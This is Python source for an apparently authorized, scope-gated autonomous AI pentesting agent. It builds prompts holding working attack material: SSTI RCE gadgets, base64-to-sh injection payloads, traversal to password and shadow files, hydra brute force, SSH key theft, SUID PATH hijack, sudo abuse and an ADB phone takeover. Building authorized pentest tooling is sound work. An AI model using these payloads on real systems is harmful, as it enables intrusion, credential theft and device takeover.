"""Prompt construction + tolerant reply parsing for the Executor loop. Free-text prompts
(no JSON mode) + JSON-then-Markdown parsing, per Sensei's experience with local GGUF models."""
import re
from dataclasses import dataclass

from grin.finding import Finding, normalize_severity
from grin.jsonextract import extract_json
from grin.mode import ASSESSMENT, CTF
from grin.secret import Secret

SYSTEM = (
    "You are Grin's Executor, an autonomous penetration-testing agent operating under an "
    "explicit, human-authorized, scope-bound engagement. You accomplish ONE objective by "
    "driving Kali/BlackArch tools. Every action you propose is checked by a scope/ROE "
    "gatekeeper before it runs; out-of-scope or disallowed actions are refused and you must "
    "adapt. Be EFFICIENT: a strong operator reaches the goal in the FEWEST actions by reading "
    "each result and following the lead it reveals — not by guessing many things. Propose the "
    "SINGLE next action, or finish with findings. Reply with ONE JSON object and nothing else."
)

# Assessment-mode mission (mode == ASSESSMENT). A real app has no flag; success is concrete,
# reproducible vulnerability findings reported to the owner. This block REPLACES the CTF
# flag-hunting methodology; the CTF mission is unchanged and still used in every other mode.
ASSESSMENT_MISSION = (
    "## Mission: security ASSESSMENT (not a CTF — there is NO flag)\n"
    "You are assessing a REAL application for REAL vulnerabilities to report to its owner. Success "
    "is a set of CONCRETE, REPRODUCIBLE findings — NOT capturing a flag. Do NOT hunt for flag files "
    "or capture-the-flag artifacts, and do NOT blindly spray injection payloads at random parameters. "
    "A real app has none of those; doing so burns the budget and produces nothing.\n\n"
    "## What to do\n"
    "1. ENUMERATE the reachable surface: fetch the app, read the body for links, comments, and "
    "referenced paths; note API endpoints, static paths, and any directory that serves content.\n"
    "2. For THIS engagement, hunt BROKEN ACCESS CONTROL: request endpoints and resources as an "
    "UNAUTHENTICATED client (no login, no token) and read what comes back. A resource that returns "
    "sensitive data or privileged functionality WITHOUT credentials is a broken-access-control "
    "finding.\n"
    "   - PREFER the `bac-probe` helper: it requests a list of candidate paths unauthenticated and "
    "reports the ones exposing sensitive content (e.g. `/ftp/...`, admin areas, backups, `.git`, data "
    "APIs): `bac-probe --url http://<target>/`.\n"
    "   - CONFIRM by reading the response: a 200 returning confidential content (a file listing, a "
    "backup, another entity's data) is the finding; a login page or a 401/403 is NOT.\n"
    "3. If the goal provides CREDENTIALS for two users, ALSO test for IDOR (broken object-level "
    "authorization) — whether one user can read another user's objects. Use the `idor-probe` helper, "
    "which logs in both and checks whether user A can read user B's resource:\n"
    "   `idor-probe --url http://<target>:<port> --user-a <emailA:passA> --user-b <emailB:passB> "
    "--resource /rest/basket/{id}`\n"
    "   A reported IDOR is a finding with `vuln_class: idor` and the resource path as `location`.\n"
    "3b. Test for SQL INJECTION at the login with the `sqli-probe` helper — it sprays injection "
    "payloads in the login field and flags a login that succeeds WITHOUT valid credentials:\n"
    "   `sqli-probe --url http://<target>:<port>`\n"
    "   A reported bypass is a finding with `vuln_class: sql-injection`.\n"
    "4. REPORT each confirmed issue in the `findings` list of your reply, each with: a clear title, "
    "the `vuln_class` (`broken-access-control` or `idor`), the exact `location` (the path/endpoint), a "
    "severity, and the EVIDENCE (the request you sent and the sensitive response).\n\n"
    "## Done\n"
    "You are done when you have enumerated the reachable surface and reported the access-control "
    "findings you can evidence — NOT when you 'capture' something. Reporting ZERO findings after "
    "thorough enumeration is a valid result: never invent one, because a false report to a real owner "
    "is worse than none.\n\n"
    "## How to reply (ONE JSON object, nothing else)\n"
    "To run a tool, reply EXACTLY:\n"
    '{"action": {"tool": "bac-probe", "command": "bac-probe --url http://<target>:<port>/"}}\n'
    "(Any shell command works the same way, e.g. tool `curl`, command `curl -s http://<target>/`.)\n"
    "To finish, reply EXACTLY:\n"
    '{"done": true, "findings": [{"title": "...", "vuln_class": "broken-access-control", '
    '"location": "/the/path", "severity": "medium", "evidence": "the request + the sensitive '
    'response", "tool": "bac-probe", "command": "...", "recommendation": "..."}]}\n'
    "Findings from bac-probe are also captured automatically — but you MUST actually RUN bac-probe "
    "(an action) first; do not declare done before running it. Return ONLY the JSON object.\n"
)


def assessment_commands(base_url, credentials=None, resource_template="/rest/basket/{id}"):
    """Exact, ready-to-run probe commands for THIS target, so the agent copies them verbatim
    instead of paraphrasing the URL/creds (the reliability bug: a dropped port and invented creds
    made a proven IDOR get missed). Returns [] for an empty base_url. idor-probe is only emitted
    when two credentials are supplied."""
    base = (base_url or "").rstrip("/")
    if not base:
        return []
    cmds = [f"bac-probe --url {base}/", f"sqli-probe --url {base}"]
    creds = list(credentials or [])
    if len(creds) >= 2:
        a, b = creds[0], creds[1]
        cmds.append(f"idor-probe --url {base} "
                    f"--user-a {a['email']}:{a['password']} "
                    f"--user-b {b['email']}:{b['password']} "
                    f"--resource {resource_template}")
    return cmds


def _recent_failure(journal):
    """Look at the most recent EXECUTED step: return (command, empty?, exit_code) if it produced no
    output or a non-zero exit — the signal that the command was malformed and needs correcting, not
    abandoning. Returns None if the last executed step looked fine (or there isn't one)."""
    for s in reversed(getattr(journal, "steps", []) or []):
        if getattr(s, "decision", "") != "executed":
            continue
        out = (getattr(s, "output", "") or "").strip()
        code = getattr(s, "exit_code", 0)
        if not out or code not in (0, None):
            cmd = s.action.get("command", "") if isinstance(s.action, dict) else ""
            return cmd, (not out), code
        return None
    return None


def _self_correct_banner(journal) -> str:
    """A deterministic, code-injected self-correction nudge. The #1 cause of stalled engagements is
    the agent treating a FAILED command (empty/error output) as 'nothing here' and moving on. This
    forces it to diagnose+retry a corrected variant — generalising across whole classes of tool
    gotchas rather than needing a per-failure prompt patch."""
    rf = _recent_failure(journal)
    if rf is None:
        return ""
    cmd, empty, code = rf
    why = "returned NO output" if empty else f"exited with code {code}"
    return (
        "## STOP — your last command did not succeed (fix it before anything else)\n"
        f"`{cmd[:160]}` {why}. Empty/error output almost always means the command was MALFORMED — "
        "NOT that there is nothing to find. Do NOT move on, give up, or repeat it verbatim. Diagnose "
        "the cause and reissue a CORRECTED variant as your next action:\n"
        "- Empty output from a URL containing `{ }` or `[ ]` (e.g. an SSTI `{{7*7}}` payload): curl "
        "GLOBBED it. Re-send with `curl -g 'http://...'` or URL-encode the braces (`%7B%7B7*7%7D%7D`).\n"
        "- `permission denied` / `404` / `No such file`: wrong path or no rights — ENUMERATE (list the "
        "parent dir, or read a backup/alternate location) instead of retrying the same target.\n"
        "- Quoting/heredoc/escaping errors: simplify quoting; write data to a file with one redirect "
        "(`printf '%s' ... > /tmp/x`) and operate on the file.\n"
        "- A tool 'not found': install it (`grin arsenal add <tool>`) or use an installed equivalent.\n\n"
    )


def build_step_prompt(objective: str, target: str, journal, allowed_classes,
                      brain=None, mode: str = CTF, base_url: str = "",
                      credentials=None) -> tuple[str, str]:
    history = journal.render_history()
    # Grin Brain: inject the proven plays for the situations detected in this run's history, so the
    # right deterministic helper is applied EVERY time instead of rediscovered by luck.
    learned = ""
    if brain is not None:
        try:
            from grin.brain import detect_situations
            learned = brain.render(detect_situations(history, target=target))
        except Exception:  # noqa: BLE001 - the brain must never break a run
            learned = ""
    if mode == ASSESSMENT:
        # Assessment mode: a different mission entirely (find + report real vulns, no flag-hunting).
        # The CTF construction below is left untouched so its behavior is byte-for-byte unchanged.
        # Note: the Brain's `learned` plays are intentionally OMITTED here — they are CTF-shaped
        # (ssh-loot / flag-grab) and would contradict the assessment mission.
        # Pre-built exact commands for this target — the reliability fix. The agent should COPY one
        # verbatim rather than paraphrase the URL/creds (paraphrasing dropped a port + invented creds
        # and made a proven IDOR get missed).
        cmds = assessment_commands(base_url, credentials)
        cmd_block = ""
        if cmds:
            cmd_block = ("## Ready-to-run commands for THIS target — copy ONE of these VERBATIM as "
                         "your action `command` (the URL and credentials are already correct; do NOT "
                         "edit them, do NOT invent placeholder creds):\n"
                         + "".join(f"  {c}\n" for c in cmds) + "\n")
        user = (
            f"Objective: {objective}\n"
            f"Authorized target: {target}\n"
            f"Permitted action classes (ROE): {', '.join(allowed_classes)}\n\n"
            + f"History so far:\n{history}\n\n"
            + _self_correct_banner(journal)
            + cmd_block
            + ASSESSMENT_MISSION
        )
        return SYSTEM, user
    user = (
        f"Objective: {objective}\n"
        f"Authorized target: {target}\n"
        f"Permitted action classes (ROE): {', '.join(allowed_classes)}\n\n"
        + learned
        + f"History so far:\n{history}\n\n"
        + _self_correct_banner(journal)
        + "## Read the result, then chase the lead (most important rule)\n"
        "Before deciding, READ the most recent result above. If it reveals anything specific — an "
        "HTML comment (`<!-- ... -->`), a link or referenced path, an endpoint, a parameter name, a "
        "version string, a username, or a credential — your VERY NEXT action MUST act on that exact "
        "lead. Do NOT guess random paths/inputs when the output already points somewhere, and do NOT "
        "ignore a hint you were just shown. Following what the tool already revealed is the fastest "
        "route to the goal.\n"
        "For web targets: fetch the page, then READ the response body for comments, links, and "
        "referenced paths, and request THOSE paths directly — don't blindly guess common paths first.\n\n"
        "## Web application methodology (don't stop at the landing page)\n"
        "A plain-looking page is rarely the whole app. Actively probe it:\n"
        "- FIND injectable params FAST with the `web-scan` helper — it fetches the page, discovers "
        "every form input + query param, AND probes a candidate list of commonly-unlinked params, "
        "spraying each with XSS payloads and reporting the exact `param=<p> payload=<...>` that "
        "reflects UNescaped (a real, reproducible reflected-XSS injection point): "
        "`web-scan --url http://<target>/` (add `--param <p>` to test one, `--method POST` for forms). "
        "Run this on any web target BEFORE hand-fuzzing — it catches the params linked nowhere that "
        "reading the HTML never reveals. A reported hit is a finding; chase the same param for the "
        "other injection classes below.\n"
        "- BROAD KNOWN-VULN COVERAGE: run `nuclei -u http://<target> -severity low,medium,high,critical "
        "-silent` early — it deterministically checks thousands of CVEs + misconfigurations and each hit "
        "is evidence-backed; record hits as findings and chase the exploitable ones (RCE/SSTI/SQLi/"
        "auth-bypass). On external scope, `subfinder -d <domain>` + `httpx` first to find live hosts.\n"
        "- Discover hidden content with `gobuster dir -u http://<target> -w "
        "/usr/share/wordlists/dirb/common.txt` (or ffuf) and `curl http://<target>/robots.txt`.\n"
        "- FUZZ PARAMETERS — many vulns live on a parameter that is NOT linked anywhere, so reading "
        "the page for links/comments will NEVER reveal them. Grepping the HTML is NOT testing: you must "
        "actively SEND requests with payloads to candidate parameters. Try these names on every "
        "endpoint: `file path page name id q search cmd host url user` — and crucially, if the page "
        "GREETS you with a value (e.g. `Hello, guest`), a parameter almost certainly controls it: "
        "immediately send `curl 'http://<target>/?name={{7*7}}'` (and `?name=test`) and check whether "
        "the value changes. Do this BEFORE giving up on a 'plain' page.\n"
        "- For each parameter, test the injection classes IN ORDER and read the response:\n"
        "    * SSTI: `?name={{7*7}}` — if the reply shows `49`, it's template injection -> RCE "
        "(escalate with `{{cycler.__init__.__globals__.os.popen('id').read()}}`).\n"
        "    * Path traversal / LFI: `?file=../../../../etc/passwd` — reads arbitrary files.\n"
        "    * OS command injection: `?host=127.0.0.1;id` / `| id` / `$(id)`.\n"
        "    * SQLi: `sqlmap -u 'http://<target>/?id=1' --batch`.\n\n"
        "## Running MULTI-STEP commands through a web RCE (SSTI / cmd-injection in a URL param)\n"
        "A URL query param mangles payloads: SPACES break it (use `${IFS}` instead of a space, or "
        "`%20`), and in base64 the chars `+` `/` `=` get corrupted (`+` decodes to a SPACE). So to run "
        "a multi-command exploit, base64-encode the WHOLE script, PERCENT-ENCODE the base64 "
        "(`+`->%2B, `/`->%2F, `=`->%3D), keep every space as `${IFS}` and every pipe as `%7C`, then "
        "pipe to sh:\n"
        "  cmd = `echo${IFS}<PCT_B64>%7Cbase64${IFS}-d%7Csh`\n"
        "  SSTI form: `?name={{cycler.__init__.__globals__.os.popen(\"echo${IFS}<PCT_B64>%7Cbase64${IFS}-d%7Csh\").read()}}`\n"
        "Inside the base64'd script use ABSOLUTE paths (`/bin/cat`, not `cat`). This single trick lands "
        "file writes, chmod, PATH changes, and privesc chains that one-line payloads cannot.\n"
        "PREFER the `web-rce` helper, which does ALL of this encoding for you — pass it a plain shell "
        "script and it runs it through the foothold and returns the output:\n"
        "  `web-rce --url http://<target>/ --param name --mode ssti --cmd '<your shell script>'`\n"
        "  `web-rce --url http://<target>/ping --param host --method POST --mode cmdi --cmd 'id'`\n"
        "  (`--mode auto` tries SSTI gadgets then injection separators automatically.)\n"
        "Use it to run a whole privesc chain in ONE action, e.g. the SUID PATH-hijack below:\n"
        "  `web-rce --url http://<t>/ --param name --mode ssti --cmd 'echo /bin/cat /root/flag.txt > "
        "/tmp/uptime; chmod 755 /tmp/uptime; PATH=/tmp:/usr/bin:/bin /usr/local/bin/syscheck'`\n\n"
        "## Android / ADB targets (port 5555 — nmap often mislabels it 'freeciv')\n"
        "If a target exposes ADB (TCP 5555, the Android Debug Bridge) it is a PHONE, not a web/SSH box — "
        "do NOT throw web-rce/sqlmap/ssh tools at it. PREFER the `adb-takeover` helper: it connects to the "
        "unauthenticated ADB, fingerprints the device, lists user apps, captures a screenshot as proof, "
        "and (with --mirror) opens a live scrcpy screen-mirror + full remote control on the operator's "
        "desktop:\n"
        "  `adb-takeover --target <ip>`            (connect, fingerprint, screenshot)\n"
        "  `adb-takeover --target <ip> --mirror`   (also open the controllable screen mirror)\n"
        "On a real phone the IMPACT is the screenshot + the live scrcpy mirror + pulling user data — there "
        "is NO flag. Do NOT run `find / -name flag*` on Android (it returns only /sys/.../flags noise). "
        "Demonstrating control of the device IS the objective.\n\n"
        "## Enumerate before you guess (most-missed step)\n"
        "Your enumeration method depends on the primitive you have:\n"
        "- With CODE EXECUTION (a shell / cmd-injection): `ls -la` EACH interesting directory, not just "
        "`/`. Listing `/` and then guessing `cat /opt/flag.txt` is the classic miss — when `ls /` shows "
        "`opt`, your NEXT step is `ls -la /opt` (which would reveal e.g. `/opt/deploy/`), then read what "
        "you find. Recurse into the interesting ones: `/opt` and its subdirs, each `/home/<user>` (incl. "
        "`.ssh/`), `/srv`, `/var/backups`, `/etc`, the app dir. Never `cat` a guessed filename when you "
        "could `ls` its parent first.\n"
        "- With FILE-READ ONLY (traversal/LFI cannot list directories): you must READ known sensitive "
        "files BY FULL PATH. Beyond SSH keys, ALWAYS try the password-hash backups — `/etc/shadow` is "
        "usually unreadable to a low-priv web user, so read its BACKUPS: `/var/backups/shadow.bak`, "
        "`/var/backups/passwd.bak`, `/var/backups/shadow`. Also `/etc/passwd` (find the real username), "
        "each user's `~/.ssh/id_rsa`, and app configs (`.env`, `config.*`).\n"
        "Either way, hunt for: SSH keys (`id_rsa`, `*.pem`, `authorized_keys`), password hashes "
        "(`/etc/shadow`, `/var/backups/*.bak`, `.htpasswd`), configs/secrets, and notes/READMEs naming "
        "other hosts or accounts. A denied/empty flag read is a signal to ENUMERATE for a credential to "
        "crack, not to keep guessing flag paths.\n\n"
        "## Phase progression\n"
        "Work through these phases in order:\n"
        "  1. Recon — discover open ports and running services (one scan is enough).\n"
        "  2. Identify the specific weakness — version-based vuln, weak credentials, injectable param, etc.\n"
        "  3. Exploit it — use the appropriate tool to gain access or extract the proof.\n"
        "  4. Escalate — if you have a foothold but the proof (e.g. a root-owned file) is not readable "
        "as the current user, ENUMERATE privilege escalation; do not just retry the same read.\n"
        "  5. Capture proof — read the flag file, dump credentials, or confirm the shell.\n"
        "The objective is NOT complete until exploitation has been attempted and the requested proof captured.\n\n"
        "## Anti-repeat rule\n"
        "Do NOT repeat any command already shown in History. "
        "Once a port or service is identified, move on to exploiting it — do not re-scan.\n\n"
        "## Exploit-tool reference (use what fits the situation)\n"
        "- Interactive tools (a tool that drops you into its OWN prompt — `msfconsole`, `meterpreter`, "
        "interactive `sqlmap`, `evil-winrm`, an `ssh`/`ftp` session): you run ONE-SHOT commands, so "
        "drive them with the `grin-shell` helper, which spawns the tool and feeds each scripted step "
        "at its prompt, returning the full transcript: "
        "`grin-shell --cmd 'msfconsole -q' --step 'use exploit/...' --step 'set RHOSTS <t>' --step 'run' "
        "--step 'exit'` or `grin-shell --cmd 'ssh user@<t>' --step 'id' --step 'cat ~/flag.txt' --step "
        "'exit'`. It auto-answers routine confirmations (ssh fingerprint, sqlmap `[Y/n]`, pagers). For a "
        "password/sudo prompt pass `--secret password=<pw>` (a credential you ALREADY obtained) — it "
        "never guesses one. Use this instead of trying to pipe a here-doc into an interactive tool.\n"
        "- Weak SSH credentials: curated credential lists are present on the runner at "
        "`/usr/share/wordlists/users.txt` (usernames) and `/usr/share/wordlists/passwords.txt` "
        "(passwords). Use them with `hydra -L /usr/share/wordlists/users.txt "
        "-P /usr/share/wordlists/passwords.txt ssh://<target>` (small + fast). Do NOT use rockyou as "
        "a USERNAME list (-L). When hydra prints a line like `login: admin password: hunter2`, "
        "take the ACTUAL username and password it found (NOT the literal letters from this example) "
        "and log in: `sshpass -p <the-found-password> ssh <the-found-username>@<target> "
        "'cat ~/flag.txt'`, then record the real `username:password` you obtained in `secrets`.\n"
        "  The full rockyou list (~14M passwords) is at `/usr/share/wordlists/rockyou.txt`. Prefer the "
        "small curated list FIRST for online brute (fast). Only escalate to rockyou ONLINE in a capped "
        "form (e.g. `head -2000 /usr/share/wordlists/rockyou.txt > /tmp/p && hydra -P /tmp/p ...`) — a "
        "full 14M-password ONLINE SSH/web brute is far too slow to finish. rockyou's real strength is "
        "OFFLINE cracking (see below).\n"
        "- Offline password cracking: this is a PRIMARY tactic, not a last resort — actively hunt for "
        "crackable material (a hash in /etc/shadow, /var/backups/*.bak, a config; a password-protected "
        "ZIP/PDF/KeePass). When you find ANY hash, crack it OFFLINE with the full rockyou list — "
        "`john --wordlist=/usr/share/wordlists/rockyou.txt <hashfile>` then `john --show <hashfile>` "
        "(or `hashcat -m <mode> <hashes> /usr/share/wordlists/rockyou.txt`) — then use the recovered "
        "password to log in. This is where the 14M list pays off (millions of guesses/sec locally, no "
        "network/lockout limits), unlike online brute.\n"
        "- Captured loot is auto-saved on YOUR runner: any private key you exfiltrate is written to "
        "`/tmp/loot/id_rsa` (chmod 600) and any password hash to `/tmp/loot/hashes.txt`. Crack and "
        "ssh against THOSE files directly — do NOT guess a key path on the target (e.g. "
        "`/root/.ssh/id_rsa`); the key lives in /tmp/loot on the box you're running from.\n"
        "- Passphrase-protected SSH key: if a private key (`id_rsa`) asks for a passphrase, CRACK IT "
        "OFFLINE: `ssh2john /tmp/loot/id_rsa > key.hash && john --wordlist=/usr/share/wordlists/rockyou.txt "
        "key.hash && john --show key.hash`, then decrypt with the passphrase "
        "(`ssh-keygen -p -P <passphrase> -N '' -f id_rsa`) and use `ssh -i id_rsa <user>@<host>`. A "
        "locked key is not a dead end.\n"
        "- Lateral movement / pivot: if the flag/proof is NOT on this host (or the goal says it lives "
        "elsewhere), use creds/keys you found here to reach OTHER in-scope hosts.\n"
        "  THE MOMENT you have BOTH a stolen SSH key (auto-saved to /tmp/loot/id_rsa) AND a discovered "
        "in-scope host (from `nmap -sn <range>`), your VERY NEXT action MUST be the `ssh-loot` helper — "
        "it cracks the key passphrase, decrypts, reads the README for the account, tries the right "
        "username, and reads the flag from home, in ONE shot:\n"
        "  `ssh-loot --host <discovered-host> --key /tmp/loot/id_rsa --readme '<the README/clue text>'`\n"
        "  Do NOT instead: run nmap SSH NSE scripts (ssh-auth-methods/ssh-run/etc.), try `root` or an "
        "EMPTY password, or ssh without `-i <key>`. The key+README is the way in, not a brute force. "
        "If you must do it manually: (1) the key is at /tmp/loot/id_rsa already; (2) crack the "
        "passphrase if locked (ssh2john + rockyou, above); (3) `nmap -sn <range>` to find the host; "
        "(4) `ssh -i /tmp/loot/id_rsa <user-from-README>@<discovered-host> 'cat ~/flag.txt'`.\n"
        "  PREFER the `ssh-loot` helper for this pivot — it cracks the key passphrase, decrypts, tries "
        "the likely usernames (incl. one named in a README) and reads the flag from home, in one shot: "
        "`ssh-loot --host <discovered-host> --key /tmp/loot/id_rsa --readme '<readme text>'`.\n"
        "- USERNAME for a stolen key: do NOT default to `root`. The moment you exfiltrate a key, ALSO "
        "read any adjacent README/clue/comment (e.g. `cat /opt/*/README`) — it names the SERVICE "
        "ACCOUNT the key belongs to (e.g. 'deploy key for the analyst service account' -> user "
        "`analyst`). SSH as THAT user, and if it fails try the usernames from the key's path/owner.\n"
        "- Web command injection: test parameters with `curl` and chain shell metacharacters. CYCLE "
        "the separators — one is often filtered while another works: `;id`, `|id`, `&&id`, `$(id)`, "
        "`%0aid` (newline). If a payload returns only the NORMAL command output (e.g. the ping result) "
        "with no `uid=`, that separator is filtered — switch to the next one before moving on. Once "
        "`|id` (or whichever) shows `uid=`, reuse THAT separator for every follow-up command.\n"
        "- Once you have a shell or file-read primitive, READ THE FLAG WHERE IT ACTUALLY LIVES. The "
        "flag belongs to the user you are running as: try `cat ~/flag.txt` FIRST, then "
        "`cat /home/<user>/flag.txt`, `/root/flag.txt`, `/flag.txt`, `/flag`. Do this immediately "
        "after a foothold or an SSH pivot — when you `ssh user@host`, the flag is almost always that "
        "user's `~/flag.txt`. Prefer these exact paths over a broad `find / -name 'flag*'`, which "
        "drowns in `/sys/.../flags` noise and wastes the budget.\n"
        "- Privilege escalation (use when you have code execution as a low-priv user but the proof is "
        "a protected/root-owned file you cannot read): a 'Permission denied' on the flag means ESCALATE, "
        "not retry — and do NOT fall back to re-scanning/re-enumerating the web app. The flag is usually "
        "at `/root/flag.txt`; if you can't read it as the foothold user, ESCALATE.\n"
        "  PREFER the `sudo-gtfo` helper through your web foothold — it runs `sudo -l`, finds the "
        "NOPASSWD binary, and abuses the right GTFOBins gadget (find/awk/python/vim/less/env/...) to "
        "read the flag as root, all in ONE call:\n"
        "  `sudo-gtfo --url http://<t>/ping --param host --method POST --mode cmdi --flag /root/flag.txt`\n"
        "  Manually: first enumerate via the foothold — `web-rce ... --cmd 'sudo -l'` (sudo rights), "
        "`web-rce ... --cmd 'find / -perm -4000 -type f 2>/dev/null'` (SUID), `id`. If `sudo -l` shows a "
        "NOPASSWD binary, abuse it via GTFOBins — e.g. find: `sudo find <flagfile> -exec cat {} \\;`; "
        "vim/less/awk/python similarly spawn a root read/shell. Run the privesc command through your "
        "existing primitive (the same injection parameter / web-rce).\n"
        "  PATH HIJACK of a SUID binary: if a SUID-root binary calls another program by BARE NAME "
        "(check `strings <suidbin>` for a relative call like `system(\"uptime\")`), plant your own that "
        "command in /tmp doing the root read by ABSOLUTE path, make it executable, and run the SUID "
        "with /tmp first on PATH:\n"
        "  `echo${IFS}/bin/cat${IFS}/root/flag.txt>/tmp/uptime; chmod${IFS}755${IFS}/tmp/uptime; "
        "PATH=/tmp:/usr/bin:/bin${IFS}<suidbin>` — the SUID runs your `uptime` as root and prints the "
        "flag. Deliver this as a base64 payload per the web-RCE rule above when your primitive is a URL.\n"
        "  PREFER the `suid-hijack` helper for this whole privesc — it enumerates SUID via your web "
        "RCE, finds the bare-name call, and PATH-hijacks it automatically: "
        "`suid-hijack --url http://<t>/ --param name --mode ssti --flag /root/flag.txt`.\n"
        "- FTP anonymous login: `ftp <target>` with user `anonymous`\n"
        "- SMB shares: `smbclient -L //<target> -N` then `smbclient //<target>/<share> -N`\n\n"
        "Decide the SINGLE next action, or finish if the objective is met.\n\n"
        "## Target field rule\n"
        "The `target` field must be a HOST or IP from the authorized scope — NEVER a file path or directory.\n\n"
        "## Credential-capture rule\n"
        "The moment you obtain credentials (e.g. hydra reports a valid login, or you confirm a password), "
        "IMMEDIATELY use them to log in (e.g. `sshpass -p <pw> ssh <user>@<target> 'cat <flagfile>'`) "
        "and capture the proof. ALWAYS record any credentials you obtain in the `secrets` array "
        "(with the full value) before finishing — a captured credential that is not recorded is lost.\n\n"
        "To act, reply EXACTLY:\n"
        '{"action": {"tool": "<tool>", "command": "<your command>", '
        f'"target": "{target}", "declared_class": "<permitted-class>", '
        '"why": "short reason"}}\n\n'
        "To finish, reply EXACTLY:\n"
        '{"done": true, "findings": [{"title": "...", '
        '"severity": "info|low|medium|high|critical", "evidence": "...", "tool": "...", '
        '"command": "...", "recommendation": "..."}], '
        '"secrets": [{"label": "...", "value": "...", "target": "...", "tool": "...", '
        '"command": "...", "context": "..."}]} '
        "(include any credentials/keys/tokens you actually obtained in `secrets`, with full values; "
        "omit the secrets array or leave it empty if none were captured)\n\n"
        "Return ONLY the JSON object."
    )
    return SYSTEM, user


@dataclass
class StepDecision:
    kind: str
    action: dict | None = None
    findings: list | None = None
    secrets: list | None = None


def _extract_json(raw: str):
    # robust: first balanced JSON object bearing an executor key (handles a valid action followed
    # by trailing prose or an echoed done-template). See grin/jsonextract.py.
    return extract_json(raw, want=("action", "done", "findings"))


def _parse_secrets(items, default_target) -> list:
    out = []
    for it in items or []:
        if not isinstance(it, dict):
            continue
        label = str(it.get("label", "")).strip()
        value = str(it.get("value", "")).strip()
        if not (label and value):
            continue
        out.append(Secret(
            label=label, value=value,
            target=str(it.get("target") or default_target).strip(),
            tool=str(it.get("tool", "")).strip(),
            command=str(it.get("command", "")).strip(),
            context=str(it.get("context", "")).strip(),
        ))
    return out


def _parse_findings(items, default_target) -> list:
    out = []
    for it in items or []:
        if not isinstance(it, dict):
            continue
        title = str(it.get("title", "")).strip()
        if not title:
            continue
        out.append(Finding(
            title=title,
            target=str(it.get("target") or default_target).strip(),
            severity=normalize_severity(it.get("severity")),
            evidence=str(it.get("evidence", "")).strip(),
            tool=str(it.get("tool", "")).strip(),
            command=str(it.get("command", "")).strip(),
            recommendation=str(it.get("recommendation", "")).strip(),
            vuln_class=str(it.get("vuln_class", "")).strip(),
            location=str(it.get("location", "")).strip(),
        ))
    return out


_CMD_RE = re.compile(r"(?im)^\s*[#>*\-\s]*\**\s*command\s*\**\s*:\s*(.+)$")


def _maybe_prepend_tool(tool: str, command: str) -> str:
    """If command's first token starts with '-' (binary was dropped), prepend the tool name."""
    if tool and command:
        first_token = command.split()[0] if command.split() else ""
        if first_token.startswith("-"):
            return f"{tool} {command}"
    return command


def parse_step(raw: str, default_target: str) -> StepDecision:
    data = _extract_json(raw)
    if isinstance(data, dict):
        act = data.get("action")
        if isinstance(act, dict) and str(act.get("tool", "")).strip() \
                and str(act.get("command", "")).strip():
            dc = act.get("declared_class")
            tool = str(act["tool"]).strip()
            command = _maybe_prepend_tool(tool, str(act["command"]).strip())
            return StepDecision("action", action={
                "tool": tool,
                "command": command,
                "target": str(act.get("target") or default_target).strip(),
                "declared_class": str(dc).strip() if dc else None,
                "why": str(act.get("why", "")).strip(),
            })
        if data.get("done") or "findings" in data:
            return StepDecision("done",
                                findings=_parse_findings(data.get("findings", []), default_target),
                                secrets=_parse_secrets(data.get("secrets", []), default_target))
    # Markdown fallback: a "Command:" line -> an action (tool = first token).
    m = _CMD_RE.search(raw or "")
    if m:
        command = m.group(1).strip().strip("`").strip()
        if command:
            return StepDecision("action", action={
                "tool": command.split()[0], "command": command,
                "target": default_target, "declared_class": None, "why": "",
            })
    return StepDecision("parse_miss")
